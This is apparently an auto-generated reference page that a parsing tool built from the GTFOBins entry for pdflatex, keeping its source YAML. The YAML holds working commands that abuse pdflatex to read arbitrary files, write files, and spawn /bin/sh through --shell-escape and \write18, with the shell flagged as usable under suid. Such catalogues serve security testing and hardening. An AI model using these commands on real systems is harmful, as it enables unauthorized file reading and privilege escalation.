---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# pdflatex

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `pdflatex` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/pdflatex` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [pdflatex](../../tools/linux/pdflatex.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | pdflatex |
| name | pdflatex |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/pdflatex/ |

## Preserved Source Material

```yaml
_body: ''
_name: pdflatex
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/pdflatex
functions:
  file-read:
  - code: 'pdflatex ''\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}''

      pdftotext texput.pdf -'
    comment: The read file will be part of the PDF output.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  file-write:
  - code: pdflatex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}'
    comment: The file can only be written in the current directory, and the `.tex` extension is mandatory.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  shell:
  - code: pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
```
